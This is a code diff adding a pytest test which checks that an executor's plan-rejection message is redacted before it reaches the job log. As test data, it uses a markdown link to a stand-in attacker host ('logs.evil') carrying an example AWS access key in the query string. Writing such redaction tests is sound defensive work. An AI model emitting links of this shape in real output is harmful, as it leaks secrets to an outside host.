@@ -414,6 +414,22 @@ class TestMain:
         assert "plan rejected" in capsys.readouterr().err
         assert calls == []
 
+    def test_a_rejection_reaching_the_job_log_is_redacted(
+            self, main_env, monkeypatch, capsys):
+        # A plan Rejection interpolates the refused value the same way an
+        # artifact one does, and this executor holds the policy: the transcript
+        # and the stream capture are redacted, so the job log was the remaining
+        # emit path.
+        step = suggest()
+        step["args"]["note"] = "see [d](http://logs.evil/?k=AKIAIOSFODNN7EXAMPLE)"
+        (main_env / "plan.json").write_text(json.dumps({"steps": [step]}))
+        stub_pr(monkeypatch, pr_payload())
+        with pytest.raises(SystemExit):
+            execute_plan.main()
+        err = capsys.readouterr().err
+        assert "plan rejected" in err
+        assert "AKIAIOSFODNN7EXAMPLE" not in err
+
     def test_a_plan_scoped_to_the_wrong_file_is_rejected_here_too(
             self, main_env, monkeypatch, capsys):
         # The executor re-verifies scope rather than trusting the plan job to
